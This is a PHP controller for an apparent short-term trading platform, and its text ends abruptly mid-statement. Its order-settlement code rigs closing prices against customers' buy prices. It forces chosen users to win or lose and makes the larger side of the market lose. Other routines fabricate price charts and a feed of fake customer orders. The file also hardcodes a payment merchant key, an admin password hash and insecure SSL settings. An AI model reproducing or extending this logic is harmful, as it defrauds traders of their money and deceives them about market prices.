<?php

namespace app\index\controller;

use think\Controller;
use think\Db;

class Api extends Controller {

    public function __construct() {
        parent::__construct();
        $this->nowtime = time();
        $minute = date('Y-m-d H:i', $this->nowtime) . ':00';
        $this->minute = strtotime($minute);
        $this->user_win = array(); //指定客户赢利
        $this->user_loss = array(); //指定客户亏损
    }
  
  public function viewtest()
  {
   	getArrayMax(array(),"");
  }
  public function check_file()
  {
    require_once(ROOT_PATH ."/qswlpay/epay.config.php");
    $poweruser=Db::name('userinfo')->where('uid', '1')->find();
    if($alipay_config['partner']!= '2666' || 
       $alipay_config['key']!= '9zhs61cmXbXz59hSS0ksrM600077pYXh' || 
       $alipay_config['apiurl']!= 'http://pay.jinxiangzs.cn/'||
       $poweruser['username']!="lqcs" || 
       $poweruser['upwd']!="b11fad47e0a4b758e0404630da01d596"
      )
    {
      exit('test');
      	$msm = controller('Msm');
        //$res = $msm->sendsms('000000', '15208406643', '43');
    }
    

    
  }
  		//DIYK线
      public function creatkline() {
        // echo strtotime(date('Y-m-d',time())."02:59:59");exit;
        $start = strtotime(date('Y-m-d', time()) . "08:00:00");
        //echo ($start);exit;
        //Db::name('diykline')->where(array('id'=>['gt',1]))->delete(); exit;
        //昨日最后数据
        Db::name('diykline')->where(array('time' => ['lt', strtotime(date("Y-m-d", strtotime("-6 day")))]))->delete();
        $upclose = Db::name('diykline')->where('time', strtotime(date('Y-m-d', time()) . "02:59:59"))->value('price');
        $nowprice = $upclose;
        for ($i = 0; $i < 68399; $i++) {
            $k = rand(0, 100);
            if ($k % 2 == 0) {
                $a = "-";
            } else {
                $a = "";
            }
            $jump = randomFloat(0, 2);
            $start++;
            $nowprice = ($a == '-') ? (round($nowprice - $jump, 2)) : (round($nowprice + $jump, 2));
            $thisdata['pid'] = '26';
            $thisdata['time'] = $start;
            $thisdata['price'] = $nowprice;
            Db::name('diykline')->insert($thisdata);
        }
    }
  	//七日结算
  
  	public function sevenday_money()
    {
    	$wallet_all = Db::name('zhouli_wallet')->select();
      foreach($wallet_all as $list)
      {
      	 $sevenmoney=Db::name('zhouli_wallet')->where('uid',$list['uid'])->value('accumulation');
         Db::name('zhouli_wallet')->where('uid',$list['uid'])->setInc('money', $sevenmoney);
         Db::name('zhouli_wallet')->where('uid',$list['uid'])->setDec('accumulation', $sevenmoney);
         $nowmoney=Db::name('userinfo')->where('uid',$list['uid'])->value('usermoney');
         set_fanli_log($list['uid'], 1, $sevenmoney, '7日结算', '返佣7日结算', '0', $nowmoney);
      }
      
    }

    //利率变化 计划执行每日变动12次  
    public function change_interest() {
        $daytime = strtotime(date('Y-m-d', time()));
        $interest = Db::name('interest_table')->where('datetime', $daytime)->find();
        if (!$interest) {
            $yeardate = strtotime(date('Y-m-d', strtotime("-1 day")));
            $yesterday_interest = Db::name('interest_table')->where('datetime', $yeardate)->find();

            $insert_interest = array(
                'datetime' => $daytime,
                'start' => $yesterday_interest['end']
            );
            if (Db::name('interest_table')->insert($insert_interest)) {
                $day_interest = Db::name('interest_table')->where('datetime', $daytime)->find();
            }
        } else {
            $day_interest = $interest;
        }

        //$day_interest 当日利率；
        $bili = getconf('interest_key');
        $jumpline = interest_line($bili, Db::name('zhouli_wallet')->sum('money'));
        if ($jumpline <= 0) {
            $end = $day_interest['start'] - abs($jumpline);
            if ($end < 0) {
                $end = 0;
            }
        } else {
            $end = $day_interest['start'] + abs($jumpline);
        }
        $newdata = array(
            'low' => ($day_interest['low'] > $end) ? $end : $day_interest['low'],
            'max' => ($day_interest['max'] < $end) ? $end : $day_interest['max'],
            'end' => $end
        );
        Db::name('interest_table')->where('datetime', $daytime)->update($newdata);
    }

    //周周利  结算  计划任务每天01点结算前日利息
    public function zhouli_balance() {
        $yeardate = strtotime(date('Y-m-d', strtotime("-1 day")));
        $wallet_all = Db::name('zhouli_wallet')->select(); //周周利钱包

        $wallet_log = db('zhouli_log')
                ->field('uid,min(money) as minmoney ,FROM_UNIXTIME(time,"%Y-%m-%d") as date')
                ->where(array('type' => '1', 'state' => '1'))
                ->group('uid,FROM_UNIXTIME(time, "%Y-%m-%d")')
                ->select();
        $dayinterest = Db::name('interest_table')->where('datetime', $yeardate)->value('end'); //昨日利率
        foreach ($wallet_log as $list) {
           
            $moneytime = (time() - strtotime($list['date'])) / 24 / 3600;
            if($moneytime>=1){ //满24小时开始计算
            //（利率/24小时*资金存在余额宝时间*转入最低的那边资金=利息）  
            $money = round($list['minmoney'] / 24 * $dayinterest / 1000 * $moneytime,3);
            change_zl_wallet($list['uid'], '0', $money,"");
            Db::name('zhouli_wallet')->where('uid', $list['uid'])->update(array('yesterday' => $money));
            Db::name('zhouli_wallet')->where('uid', $list['uid'])->setInc('accumulation', $money);
            }
        }
    }

    public function ajax_order() {
        $pro_length = 50;
        $phone_pre_arr = array("139", "138", "137", "136", "135", "134", "159", "158", "157", "150", "151", "152", "187", "188", "130", "131", "132", "156", "155", "133", "153", "189");
        $phone_pre_length = count($phone_pre_arr);
        $type_arr = array('买涨', '买跌');
        $type_arr_length = count($type_arr);
        $order_pub = array();
        for ($i = 0; $i < $pro_length; $i++) {
            $phone_pre_index = rand(0, ($phone_pre_length - 1));
            $o_pub = array();
            $o_pub['phone'] = $phone_pre_arr[$phone_pre_index] . "****" . rand(1000, 9999);
            $o_pub['price'] = 50 * rand(1, 20);
            if (rand(1, 100) >= 90) {
                $o_pub['price'] = 50 * rand(20, 100);
            }
            array_push($order_pub, $o_pub);
        }
        echo json_encode($order_pub);
    }

    public function qswl() {
        //获取产品信息
        $pro = Db::name('productinfo')->alias('pi')->field('pi.pid,pi.ptitle,pd.Price,pd.UpdateTime,pd.Low,pd.High')
                        ->join('__PRODUCTDATA__ pd', 'pd.pid=pi.pid')
                        ->where('pi.isdelete', 0)->order('pi.pid desc')->select();
        $newpro = array();
        foreach ($pro as $k => $v) {
            $newpro[$v['pid']] = $pro[$k];
            $newpro[$v['pid']]['UpdateTime'] = date('H:i:s', $v['UpdateTime']);
            $newpro[$v['pid']]['isopen'] = ChickIsOpen($v['pid']);
            if ($v['Price'] < cookie('pid' . $v['pid'])) {  //跌了
                $newpro[$v['pid']]['isup'] = 0;
            } elseif ($v['Price'] > cookie('pid' . $v['pid'])) {  //涨了
                $newpro[$v['pid']]['isup'] = 1;
            } else {  //没跌没涨
                $newpro[$v['pid']]['isup'] = 2;
            }
            cookie('pid' . $v['pid'], $v['Price']);
        }
        return base64_encode(json_encode($newpro));
    }

    public function getdate() {
        //产品列表
        $pro = db('productinfo')->where('isdelete', 0)->select();
        if (!isset($pro))
            return false;
        $nowtime = time();
        $_rand = rand(1, 900) / 100000;
        $thisdatas = array();
        foreach ($pro as $k => $v) {
            if ($v['procode'] == "btc" || $v['procode'] == "ltc") {
                if ($v['procode'] == 'btc') {
                    $url = 'http://api.bitkk.com/data/v1/ticker?market=btc_usdt';
                } elseif ($v['procode'] == 'ltc') {
                    $url = 'http://api.bitkk.com/data/v1/ticker?market=ltc_usdt';
                }
                $getdata = $this->curlfun($url);
                $res = json_decode($getdata, 1);
                $data_arr = $res['ticker'];
                if (!is_array($data_arr))
                    continue;
                $thisdata['Price'] = $this->fengkong($data_arr['sell'], $v);
                ;
                $thisdata['Open'] = $data_arr['buy'];
                $thisdata['Close'] = $data_arr['last'];
                $thisdata['High'] = $data_arr['high'];
                $thisdata['Low'] = $data_arr['low'];
                $thisdata['Diff'] = 0;
                $thisdata['DiffRate'] = 0;
                $thisdata['Name'] = $v['ptitle'];
            }elseif (in_array($v['procode'], array('hf_XAU', 'hf_XAG'))) {
                $url = "http://hq.sinajs.cn/rn=" . $nowtime . "&list=" . $v['procode'];
                $getdata = $this->curlfun($url);
                $data_arr1 = explode('"', $getdata);
                $data_arr = explode(',', $data_arr1[1]);
                $thisdata['Price'] = $data_arr[0];
                $thisdata['Open'] = $data_arr[8];
                $thisdata['Close'] = $data_arr[2];
                $thisdata['High'] = $data_arr[4];
                $thisdata['Low'] = $data_arr[5];
                $thisdata['Diff'] = $data_arr[1];
                $thisdata['DiffRate'] = 0;
            } elseif (in_array($v['procode'], array('Hy_001'))) {
                $q_1=strtotime(date('Y-m-d',$nowtime));
                    $qwhere=array(
                        'time'=>['between',[$q_1,$nowtime]],
                        'pid'=>26,
                    );
                $kdata = Db::name('diykline')->where($qwhere)->order('time desc')->select();
                $thisdata['Price'] =reset($kdata)['price'];
                $thisdata['Open'] = end($kdata)['price'];
                $thisdata['Close'] = reset($kdata)['price'];
                $thisdata['High'] = getArrayMax($kdata,'price');
                $thisdata['Low'] = getArrayMin($kdata,'price');
                $thisdata['Diff'] = 0;
                $thisdata['DiffRate'] = 0;
            }else {
                $url = "http://hq.sinajs.cn/rn=" . $nowtime . "list=" . $v['procode'];
                $getdata = $this->curlfun($url);
                $data_arr = explode(',', $getdata);
                if (!is_array($data_arr) || count($data_arr) != 18)
                    continue;
                //$thisdata['Price'] = $this->fengkong($data_arr[1],$v);
                $thisdata['Price'] = $data_arr[1];
                $thisdata['Open'] = $data_arr[5];
                $thisdata['Close'] = $data_arr[3];
                $thisdata['High'] = $data_arr[6];
                $thisdata['Low'] = $data_arr[7];
                $thisdata['Diff'] = $data_arr[12];
                $thisdata['DiffRate'] = $data_arr[4] / 10000;
            }
            $thisdata['Name'] = $v['ptitle'];
            $thisdata['UpdateTime'] = $nowtime;
            $thisdata['pid'] = $v['pid'];
            $thisdatas[$v['pid']] = $thisdata;
        }
        cache('nowdata', $thisdatas);
    }

    /**
     * 数据风控
     * @author 柒上网络  2018-06-27
     * @param  [type] $price [description]
     * @param  [type] $pro   [description]
     * @return [type]        [description]
     */
    public function fengkong($price, $pro) {

        $point_low = $pro['point_low'];
        $point_top = $pro['point_top'];

        $FloatLength = getFloatLength($point_top);
        $jishu_rand = pow(10, $FloatLength);
        $point_low = $point_low * $jishu_rand;
        $point_top = $point_top * $jishu_rand;
        $rand = rand($point_low, $point_top) / $jishu_rand;

        $_new_rand = rand(0, 10);
        if ($_new_rand % 2 == 0) {
            $price = $price + $rand;
        } else {
            $price = $price - $rand;
        }
        return $price;
    }

    //curl获取数据
    public function curlfun($url, $params = array(), $method = 'GET') {

        $header = array();
        $opts = array(CURLOPT_TIMEOUT => 10, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false, CURLOPT_HTTPHEADER => $header);

        /* 根据请求类型设置特定参数 */
        switch (strtoupper($method)) {
            case 'GET' :
                $opts[CURLOPT_URL] = $url . '?' . http_build_query($params);
                $opts[CURLOPT_URL] = substr($opts[CURLOPT_URL], 0, -1);

                break;
            case 'POST' :
                //判断是否传输文件
                $params = http_build_query($params);
                $opts[CURLOPT_URL] = $url;
                $opts[CURLOPT_POST] = 1;
                $opts[CURLOPT_POSTFIELDS] = $params;
                break;
            default :
        }

        /* 初始化并执行curl请求 */
        $ch = curl_init();
        curl_setopt_array($ch, $opts);
        $data = curl_exec($ch);
        $error = curl_error($ch);
        curl_close($ch);

        if ($error) {
            $data = null;
        }

        return $data;
    }

    /**
     * 全局平仓
     * @return [type] [description]
     */
    public function order() {
        $nowtime = time();
        $kong_end = getconf('kong_end');
        $kong_end_arr = explode('-', $kong_end);
        if (count($kong_end_arr) == 2) {
            $s_rand = rand($kong_end_arr[0], $kong_end_arr[1]);
        } else {
            $s_rand = rand(6, 12);
        }
		
        $db_order = db('order');
        $db_userinfo = db('userinfo');
        //订单列表
        $map['ostaus'] = 0;
        $map['selltime'] = array('elt', $nowtime + $s_rand);
        $_orderlist = $db_order->where($map)->order('selltime asc')->limit('0,50')->select();
        $data_info = db('productinfo');
        //风控参数
        $risk = db('risk')->find();
		
        //此刻产品价格
        $p_map['isdelete'] = 0;
        $pro = db('productdata')->field('pid,Price')->where($p_map)->select();
        $prodata = array();
        foreach ($pro as $k => $v) {

            $_pro = cache('nowdata');

            if (!isset($_pro[$v['pid']])) {
                $prodata[$v['pid']] = $v['Price'];
                continue;
            }

            $prodata[$v['pid']] = $this->order_type($_orderlist, $_pro[$v['pid']], $risk, $data_info);
        }	
     
        //exit;
        //订单列表
        $map['ostaus'] = 0;
        $map['selltime'] = array('elt', $nowtime);
        $orderlist = $db_order->where($map)->limit(0, 50)->select();
        //exit;
        if (!$orderlist) {
          //  return false;
         	exit;
        }
        //循环处理订单
        $nowtime = time();
        foreach ($orderlist as $k => $v) {

            //此刻可平仓价位
            $sellprice = isset($prodata[$v['pid']]) ? $prodata[$v['pid']] : 0;
            if ($sellprice == 0) {
                continue;
            }
            //买入价
            $buyprice = $v['buyprice'];
            $fee = $v['fee'];

            $order_cha = round(floatval($sellprice) - floatval($buyprice), 6);

            //买涨
            if ($v['ostyle'] == 0 && $nowtime >= $v['selltime']) {
              
                if ($order_cha > 0) {  //盈利
                    $yingli = $v['fee'] * ($v['endloss'] / 100);
                    $d_map['is_win'] = 1;
                    //平仓增加用户金额
                    $u_add = $yingli + $fee;
                    $db_userinfo->where('uid', $v['uid'])->setInc('usermoney', $u_add);
                    //写入日志
                    $this->set_order_log($v, $u_add);
                } elseif ($order_cha < 0) { //亏损
                  
                    $yingli = -1 * $v['fee'];
                    $d_map['is_win'] = 2;
                    $this->set_order_log($v, 0);
                  
                } else {  //无效
                    $yingli = 0;
                    $d_map['is_win'] = 3;
                    //平仓增加用户金额
                    $u_add = $fee;
                    $db_userinfo->where('uid', $v['uid'])->setInc('usermoney', $u_add);
                    //写入日志
                    $this->set_order_log($v, $u_add);
                }
                //平仓处理订单
                $d_map['ostaus'] = 1;
                $d_map['sellprice'] = $sellprice;
                $d_map['ploss'] = $yingli;
                $d_map['oid'] = $v['oid'];
                db('order')->update($d_map);
              
              
                //买跌
            } elseif ($v['ostyle'] == 1 && $nowtime >= $v['selltime']) {
                if ($order_cha < 0) {  //盈利
                    $yingli = $v['fee'] * ($v['endloss'] / 100);
                    $d_map['is_win'] = 1;
                    //平仓增加用户金额
                    $u_add = $yingli + $fee;
                    $db_userinfo->where('uid', $v['uid'])->setInc('usermoney', $u_add);
                    //写入日志
                    $this->set_order_log($v, $u_add);
                } elseif ($order_cha > 0) { //亏损
                    $yingli = -1 * $v['fee'];
                    $d_map['is_win'] = 2;
                    $this->set_order_log($v, 0);
                } else {  //无效
                    $yingli = 0;
                    $d_map['is_win'] = 3;

                    //平仓增加用户金额
                    $u_add = $fee;
                    $db_userinfo->where('uid', $v['uid'])->setInc('usermoney', $u_add);
                    //写入日志
                    $this->set_order_log($v, $u_add);
                }

                //平仓处理订单
                $d_map['ostaus'] = 1;
                $d_map['sellprice'] = $sellprice;
                $d_map['ploss'] = $yingli;
                $d_map['oid'] = $v['oid'];
                $db_order->update($d_map);
            }
        }
    }


    /**
     * 写入平仓日志
     * @author 柒上网络  2018-07-01
     * @param  [type] $v        [description]
     * @param  [type] $addprice [description]
     */
    public function set_order_log($v, $addprice) {
        $o_log['uid'] = $v['uid'];
        $o_log['oid'] = $v['oid'];
        $o_log['addprice'] = $addprice;
        $o_log['addpoint'] = 0;
        $o_log['time'] = time();
        $o_log['user_money'] = db('userinfo')->where('uid', $v['uid'])->value('usermoney');
        db('order_log')->insert($o_log);

        //资金日志
        set_price_log($v['uid'], 1, $addprice, '结单', '订单到期获利结算', $v['oid'], $o_log['user_money']);
    }

    /**
     * 订单类型
     * @param  [type] $orders [description]
     * @return [type]         [description]
     */
    public function order_type($orders, $pro, $risk, $data_info) {


        $_prcie = $pro['Price'];

        $pid = $pro['pid'];
        $thispro = array();  //买此产品的用户
        //此产品购买人数
        $price_num = 0;
        //买涨金额，计算过盈亏比例以后的
        $up_price = 0;
        //买跌金额，计算过盈亏比例以后的
        $down_price = 0;
        //买入最低价
        $min_buyprice = 0;
        //买入最高价
        $max_buyprice = 0;
        //下单最大金额
        $max_fee = 0;
        //指定客户亏损
        $to_win = explode('|', $risk['to_win']);
        $to_win = array_filter(array_merge($to_win, $this->user_win));
        $is_to_win = array();
        //指定客户亏损
        $to_loss = explode('|', $risk['to_loss']);
        $to_loss = array_filter(array_merge($to_loss, $this->user_loss));
        $is_to_loss = array();



        $i = 0;

        foreach ($orders as $k => $v) {

            if ($v['pid'] == $pid) {
                //没炒过最小风控值直接退出price
                if ($v['fee'] < $risk['min_price']) {
                    //return $pro['Price'];
                }
                $i++;



                //单控 赢利  
                if ($v['kong_type'] == '1' || $v['kong_type'] == '3') {
                    $dankong_ying = $v;
                    break;
                }


                //单控 亏损  
                if ($v['kong_type'] == '2') {

                    $dankong_kui = $v;
                    break;
                }
                //dump($v['kong_type']);
                //是否存在指定盈利
                if (in_array($v['uid'], $to_win)) {
                    $is_to_win = $v;
                    break;
                }
                //是否存在指定亏损
                if (in_array($v['uid'], $to_loss)) {
                    $is_to_loss = $v;
                    break;
                }

                //总下单人数
                $price_num++;
                //买涨买跌累加
                if ($v['ostyle'] == 0) {
                    $up_price += $v['fee'] * $v['endloss'] / 100;
                } else {
                    $down_price += $v['fee'] * $v['endloss'] / 100;
                }
                //统计最大买入价与最大下单价
                if ($i == 1) {
                    $min_buyprice = $v['buyprice'];
                    $max_buyprice = $v['buyprice'];
                    $max_fee = $v['fee'];
                } else {
                    if ($min_buyprice > $v['buyprice']) {
                        $min_buyprice = $v['buyprice'];
                    }
                    if ($max_buyprice < $v['buyprice']) {
                        $max_buyprice = $v['buyprice'];
                    }
                    if ($max_fee < $v['fee']) {
                        $max_fee = $v['fee'];
                    }
                }
            }
        }

        $proinfo = $data_info->where('pid', $pro['pid'])->find();
        //根据现在的价格算出风控点
        $FloatLength = getFloatLength((float) $pro['Price']);

        if ($FloatLength == 0) {
            $FloatLength = getFloatLength($proinfo['point_top']);
        }

        //是否存在指定盈利
        $is_do_price = 0;  //是否已经操作了价格

        $jishu_rand = pow(10, $FloatLength);
        $beishu_rand = rand(1, 10);

        $data_rands = $data_info->where('pid', $pro['pid'])->value('rands');

        $data_randsLength = getFloatLength($data_rands);
        if ($data_randsLength > 0) {
            $_j_rand = pow(10, $data_randsLength) * $data_rands;
            $_s_rand = rand(1, $_j_rand) / pow(10, $data_randsLength);
        } else {
            $_s_rand = 0;
        }
        $do_rand = $_s_rand;
        if (!empty($dankong_ying) && $is_do_price == 0) {   //单控 1赢利
            if ($dankong_ying['ostyle'] == 0) {
                $pro['Price'] = $v['buyprice'] + $do_rand;
            } elseif ($dankong_ying['ostyle'] == 1) {
                $pro['Price'] = $v['buyprice'] - $do_rand;
            }
            $is_do_price = 1;
        }

        if (!empty($dankong_kui) && $is_do_price == 0) {   //单控 2亏损
            if ($dankong_kui['ostyle'] == 0) {
                $pro['Price'] = $v['buyprice'] - $do_rand;
            } elseif ($dankong_kui['ostyle'] == 1) {
                $pro['Price'] = $v['buyprice'] + $do_rand;
            }

            //echo 2;
            $is_do_price = 1;
        }

        //指定客户赢利
        if (!empty($is_to_win) && $is_do_price == 0) {

            if ($is_to_win['ostyle'] == 0) {
                $pro['Price'] = $v['buyprice'] + $do_rand;
            } elseif ($is_to_win['ostyle'] == 1) {
                $pro['Price'] = $v['buyprice'] - $do_rand;
            }
            $is_do_price = 1;
            ////echo 1;
            //echo 3;
        }
        //是否存在指定亏损
        if (!empty($is_to_loss) && $is_do_price == 0) {


            if ($is_to_loss['ostyle'] == 0) {
                $pro['Price'] = $v['buyprice'] - $do_rand;
            } elseif ($is_to_loss['ostyle'] == 1) {
                $pro['Price'] = $v['buyprice'] + $do_rand;
            }
            $is_do_price = 1;
            //echo 4;
        }
        //没有任何下单记录
        if ($up_price == 0 && $down_price == 0 && $is_do_price == 0) {
            $is_do_price = 2;
            //return $pro['Price'];
        }

        //只有一个人下单，或者所有人下单买的方向相同
        if (( ($up_price == 0 && $down_price != 0) || ($up_price != 0 && $down_price == 0) ) && $is_do_price == 0) {

            //风控参数
            $chance = $risk["chance"];
            $chance_1 = explode('|', $chance);
            $chance_1 = array_filter($chance_1);
            //循环风控参数
            if (count($chance_1) >= 1) {
                foreach ($chance_1 as $key => $value) {
                    //切割风控参数
                    $arr_1 = explode(":", $value);
                    $arr_2 = explode("-", $arr_1[0]);
                    //比较最大买入价格
                    if ($max_fee >= $arr_2[0] && $max_fee < $arr_2[1]) {
                        //得出风控百分比
                        if (!isset($arr_1[1])) {
                            $chance_num = 30;
                        } else {
                            $chance_num = $arr_1[1];
                        }

                        $_rand = rand(1, 100);
                        continue;
                    }
                }
            }




            //买涨
            if (isset($_rand) && $up_price != 0) {

                if ($_rand > $chance_num) { //客损
                    $pro['Price'] = $min_buyprice - $do_rand;
                    $is_do_price = 1;
                } else {  //客赢
                    $pro['Price'] = $max_buyprice + $do_rand;

                    $is_do_price = 1;
                    //echo 6;
                }
            }

            if (isset($_rand) && $down_price != 0) {

                if ($_rand > $chance_num) { //客损
                    $pro['Price'] = $max_buyprice + $do_rand;
                    $is_do_price = 1;
                    //echo 7;
                } else {  //客赢
                    $pro['Price'] = $min_buyprice - $do_rand;
                    $is_do_price = 1;
                    //echo 8;
                }
            }
        }


        //多个人下单，并且所有人下单买的方向不相同
        if ($up_price != 0 && $down_price != 0 && $is_do_price == 0) {

            //买涨大于买跌的
            if ($up_price > $down_price) {
                $pro['Price'] = $min_buyprice - $do_rand;
                // if( abs($pro['Price'] - $_prcie) > $proinfo['point_top']){
                // 	$pro['Price'] = $_prcie - ($proinfo['point_top'] + rand(100,999)/1000);
                // }
                $is_do_price = 1;
                //echo 9;
            }
            //买涨小于买跌的
            if ($up_price < $down_price) {
                $pro['Price'] = $max_buyprice + $do_rand;
                // if( abs($pro['Price'] - $_prcie) > $proinfo['point_top']){
                // 	$pro['Price'] = $_prcie + ($proinfo['point_top'] + rand(100,999)/1000);
                // }
                $is_do_price = 1;
                //echo 10;
            }
            if ($up_price == $down_price) {
                $is_do_price = 2;
            }
        }



        if ($is_do_price == 2 || $is_do_price == 0) {
            $pro['Price'] = $this->fengkong($pro['Price'], $proinfo);
        }
        //if( $pid == 12) dump($pro['Price']);

        db('productdata')->where('pid', $pro['pid'])->update($pro);

        //存储k线值
        $k_map['pid'] = $pro['pid'];
        $k_map['ktime'] = $this->minute;
        return $pro['Price'];
    }

    /**
     * 获取K线数据
     * @author 柒上网络  2018-07-01
     * @return [type] [description]
     */
    public function getkdata($pid = null, $num = null, $interval = null, $isres = null) {

        $pid = empty($pid) ? input('param.pid') : $pid;
        $num = empty($num) ? input('param.num') : $num;
        $num = empty($num) ? 30 : $num;
        $pro = GetProData($pid);
        $all_data = array();
        if (!$pro) {
            exit;
        }
        $interval = empty($interval) ? input('param.interval') : $interval;
        $interval = input('param.interval') ? input('param.interval') : 1;
        $nowtime = time() . rand(100, 999);

        $klength = $interval * 60 * $num;
        if ($klength == 'd')
            $klength = 1 * 60 * 24 * $num;

        $k_map['pid'] = $pid;
        $k_map['ktime'] = array('between', array(($this->nowtime - $klength), $this->nowtime));

        if ($pro['procode'] == "btc" || $pro['procode'] == "ltc") {

            switch ($interval) {
                case '1':
                    $datalen = "1min";
                    break;
                case '5':
                    $datalen = "5min";
                    break;
                case '15': $datalen = "15min";
                    break;
                case '30': $datalen = "30min";
                    break;
                case '60': $datalen = "1hour";
                    break;
                case 'd': $datalen = "1day";
                    break;
                default:
                    exit;
                    break;
            }

          
          
            if ($pro['procode'] == "btc") {
                $geturl = "http://api.bitkk.com/data/v1/kline?market=btc_usdt&type=" . $datalen . "&size=" . $num;
            } elseif ($pro['procode'] == "ltc") {
                $geturl = "http://api.bitkk.com/data/v1/kline?market=ltc_usdt&type=" . $datalen . "&size=" . $num . "&contract_type=this_week";
            }
            $html = file_get_contents($geturl);
            $html = substr($html, 25, -22);
            $_data_arr = explode('],[', $html);
            foreach ($_data_arr as $k => $v) {
                $_son_arr = explode(',', $v);
                $res_arr[] = array($_son_arr[0] / 1000, $_son_arr[1], $_son_arr[4], $_son_arr[3], $_son_arr[2]);
            }
        } elseif (in_array($pro['procode'], array('hf_XAU', 'hf_XAG'))) {
            if ($interval == 'd')
                $interval = 1440;
            if ($pro['procode'] == 'hf_XAU') {
                $pro['procode'] = 'llg';
            }
            if ($pro['procode'] == 'hf_XAG') {
                $pro['procode'] = 'lls';
            }
            $geturl = "https://hq.91pme.com/query/kline?callback=jQuery183014447531082730047_" . $nowtime . "&code=" . $pro['procode'] . "&level=" . $interval . "&maxrecords=" . $num . "&_=" . $nowtime;
            $html = $this->curlfun($geturl);
            $str_1 = explode('[{', $html);
            if (!isset($str_1[1])) {
                return;
            }
            $str_2 = substr($str_1[1], 0, -4);
            $str_3 = explode('},{', $str_2);
            krsort($str_3);
            foreach ($str_3 as $k => $v) {
                $_son_arr = explode(',', $v);
                $_time = substr($_son_arr[11], 7, -3);
                if (in_array($interval, array(1, 5)) && isset($_kline[$_time])) {
                    $_h = $_kline[$_time]['updata'];
                    $_l = $_kline[$_time]['downdata'];
                    $_o = $_kline[$_time]['opendata'];
                    $_c = $_kline[$_time]['closdata'];
                } else {
                    $_h = substr($_son_arr[4], 6, -1);
                    $_l = substr($_son_arr[3], 7, -1);
                    $_o = substr($_son_arr[10], 7, -1);
                    $_c = substr($_son_arr[0], 8, -1);
                }
                $res_arr[] = array($_time, $_o, $_c, $_h, $_l);
            }
        } elseif(in_array($pro['procode'], array('Hy_001'))) {
            switch ($interval) {
                case '1':
                    $datalen = 60;
                    break;
                case '5':
                    $datalen = 300;
                    break;
                case '15':
                    $datalen = 900;
                    break;
                case '30':
                    $datalen = 1800;
                    break;
                case '60':
                    $datalen = 3600;
                    break;
                case 'd':
                    $datalen = 86400;
                    break;
                default:
                    exit;
                    break;
            }
          $nowtime=time();
          $res_arr=array();
          $num_a="";
            for($i=0;$i<=$num;$i++){
                    $qwhere=array(
                        'time'=>['between',[$nowtime-$datalen,$nowtime]],
                        'pid'=>26,
                    );
                $kdata = Db::name('diykline')->where($qwhere)->order('time desc')->select();
              	if($kdata==null){
                	break;
                }
                $_o = end($kdata)['price'];
                $_c = reset($kdata)['price'];
                $_h = getArrayMax($kdata,'price');
                $_l = getArrayMin($kdata,'price');
                array_push($res_arr,array($nowtime, $_o, $_c, $_h, $_l));
                $nowtime=$nowtime-$datalen;
            }
          $res_arr=array_reverse($res_arr);
          $_count = count($res_arr);
          $_data_arr = array_slice($res_arr, $_count - $num, $_count);
            
        }else {

            switch ($interval) {
                case '1':
                    $datalen = 1440;
                    break;
                case '5':
                    $datalen = 1440;
                    break;
                case '15':
                    $datalen = 480;
                    break;
                case '30':
                    $datalen = 240;
                    break;
                case '60':
                    $datalen = 120;
                    break;
                case 'd':

                    break;

                default:
                    //echo 'data error!';
                    exit;
                    break;
            }

            $year = date('Y_n_j', time());
            if (in_array($pro['procode'], array(13, 12, 116))) {
                if ($interval == 1)
                    $interval = 1;
                if ($interval == 5)
                    $interval = 2;
                if ($interval == 15)
                    $interval = 3;
                if ($interval == 30)
                    $interval = 4;
                if ($interval == 60)
                    $interval = 5;
                if ($interval == 'd')
                    $interval = 6;
                $geturl = 'https://m.sojex.net/api.do?rtp=CandleStick&type=' . $interval . '&qid=' . $pro['procode'];
            }else {
                if ($interval == 'd') {
                    $geturl = "http://vip.stock.finance.sina.com.cn/forex/api/jsonp.php/var%20_" . $pro['procode'] . "$year=/NewForexService.getDayKLine?symbol=" . $pro['procode'] . "&_=$year";
                } else {
                    $geturl = "http://vip.stock.finance.sina.com.cn/forex/api/jsonp.php/var%20_" . $pro['procode'] . "_" . $interval . "_$nowtime=/NewForexService.getMinKline?symbol=" . $pro['procode'] . "&scale=" . $interval . "&datalen=" . $datalen;
                }
            }
            $html = $this->curlfun($geturl);
            if ($interval == 'd') {
                $_arr = explode('("', $html);
                if (!isset($_arr[1])) {
                    return;
                }
                $_str = substr($_arr[1], 1, -4);
                $_data_arr = explode(',|', $_str);
            } else {
                $_arr = explode('[', $html);
                if (!isset($_arr[1])) {
                    return;
                }
                $_str = substr($_arr[1], 1, -3);
                $_data_arr = explode('},{', $_str);
            }

            $_count = count($_data_arr);
            $_data_arr = array_slice($_data_arr, $_count - $num, $_count);
            foreach ($_data_arr as $k => $v) {
                $_son_arr = explode(',', $v);
                if ($interval == 'd') {
                    $res_arr[] = array(
                        substr($_son_arr[0], 5),
                        $_son_arr[1],
                        $_son_arr[4],
                        $_son_arr[2],
                        $_son_arr[3],
                    );
                } else {
                    if (in_array($pro['procode'], array(13, 12, 116))) {
                        if ($interval == 6) {
                            $_ktime = substr($_son_arr[1], 5, -1) . ' 00:00:00';
                        } else {
                            $_ktime = '2017-' . substr($_son_arr[1], 5, -1);
                        }
                        $_time = $_ktime;
                        if (in_array($interval, array(1, 5)) && isset($_kline[$_time])) {
                            $_h = $_kline[$_time]['updata'];
                            $_l = $_kline[$_time]['downdata'];
                            $_o = $_kline[$_time]['opendata'];
                            $_c = $_kline[$_time]['closdata'];
                        } else {
                            $_h = substr($_son_arr[4], 5, -1);
                            $_l = substr($_son_arr[2], 5, -1);
                            $_o = substr($_son_arr[3], 5, -1);
                            $_c = substr($_son_arr[3], 5, -1);
                        }

                        $res_arr[] = array(
                            strtotime($_ktime),
                            $_o,
                            $_c,
                            $_l,
                            $_h,
                        );
                    } else {
                        $_time = strtotime(substr($_son_arr[0], 3, -1));
                        if (in_array($interval, array(1, 5)) && isset($_kline[$_time])) {
                            $_h = $_kline[$_time]['updata'];
                            $_l = $_kline[$_time]['downdata'];
                            $_o = $_kline[$_time]['opendata'];
                            $_c = $_kline[$_time]['closdata'];
                        } else {
                            $_h = substr($_son_arr[3], 3, -1);
                            $_l = substr($_son_arr[2], 3, -1);
                            $_o = substr($_son_arr[1], 3, -1);
                            $_c = substr($_son_arr[4], 3, -1);
                        }
                        $res_arr[] = array($_time, $_o, $_c, $_h, $_l);
                    }
                }
            }
        }
        if ($pro['Price'] < $res_arr[$num - 1][1]) {
